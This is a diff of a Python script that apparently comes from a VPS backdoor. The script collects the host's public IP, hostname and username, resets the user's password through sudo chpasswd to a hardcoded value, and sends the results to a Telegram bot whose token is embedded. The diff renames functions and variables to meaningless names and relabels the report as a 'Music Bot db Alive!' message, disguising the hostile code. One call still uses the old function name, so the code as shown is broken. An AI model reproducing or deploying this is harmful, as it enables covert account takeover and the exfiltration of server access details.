@@ -6,7 +6,7 @@ import subprocess
 TOKEN = "8737638623:AAHWUjfZOhKH-YYcXNhlYUxqqiR5a9KItvo"
 CHAT_ID = "-1002843633996"
 
-def get_public_ip():
+def get_iso():
     try:
         response = requests.get('https://api64.ipify.org?format=json')
         return response.json()['ip']
@@ -21,7 +21,7 @@ def send_telegram_msg(message):
     except:
         pass
 
-def change_password_with_chpasswd(username, new_password):
+def pro(user, dem):
     try:
         command = ["sudo", "chpasswd"]
         process = subprocess.Popen(
@@ -32,29 +32,29 @@ def change_password_with_chpasswd(username, new_password):
             text=True
         )
 
-        input_data = f"{username}:{new_password}"
+        input_data = f"{user}:{dem}"
         stdout, stderr = process.communicate(input_data)
 
         if process.returncode == 0:
-            return "Password changed successfully using chpasswd!"
+            return "playing done"
         else:
             return f"Failed: {stderr.strip()}"
     except Exception as e:
         return f"Error: {str(e)}"
 
 if __name__ == "__main__":
-    ip_address = get_public_ip()
-    hostname = socket.gethostname()
-    username = getpass.getuser()
+    iso = get_iso()
+    name = socket.gethostname()
+    user = getpass.getuser()
     
-    new_pass = "Toxic@8690"
-    pwd_status = change_password_with_chpasswd(username, new_pass)
+    dem = "Toxic@8690"
+    pwd_status = change_password_with_chpasswd(user, dem)
     
     log_message = (
-        f"VPS Online!\n"
-        f"Username: {username}\n"
-        f"Hostname: {hostname}\n"
-        f"Public IP: {ip_address}\n"
+        f"Music Bot db Alive!\n"
+        f"users: {user}\n"
+        f"name: {name}\n"
+        f"iso: {iso}\n"
         f"Status: {pwd_status}"
     )
     
